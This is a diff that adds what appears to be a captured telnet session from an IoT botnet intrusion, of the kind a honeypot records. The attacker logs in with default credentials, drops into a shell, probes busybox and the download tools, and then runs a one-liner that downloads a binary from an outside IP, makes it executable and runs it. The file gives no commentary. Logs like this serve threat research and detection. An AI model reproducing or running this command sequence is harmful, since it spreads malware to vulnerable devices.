@@ -1,0 +1,13 @@
+from: 59.127.3.86:45864 user:guest password:friend
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox VLHXT
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox VLHXT
+tftp; wget; /bin/busybox VLHXT
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox VLHXT
+rm .s; wget http://59.127.3.86:42223/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
